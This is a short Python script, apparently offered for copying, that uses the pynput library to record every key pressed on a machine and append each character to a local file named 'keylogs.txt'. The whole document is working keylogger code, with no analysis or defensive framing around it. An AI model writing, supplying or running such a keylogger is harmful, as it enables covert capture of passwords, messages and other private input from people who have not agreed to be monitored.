from pynput import keyboard


def get_char(key):
    try:
        return key.char
    except AttributeError:
        return str(key)


def on_press(key):
    with open("keylogs.txt", 'a') as logs:
        logs.write(get_char(key))


listener = keyboard.Listener(
    on_press=on_press,
)

listener.start()
input()
# copy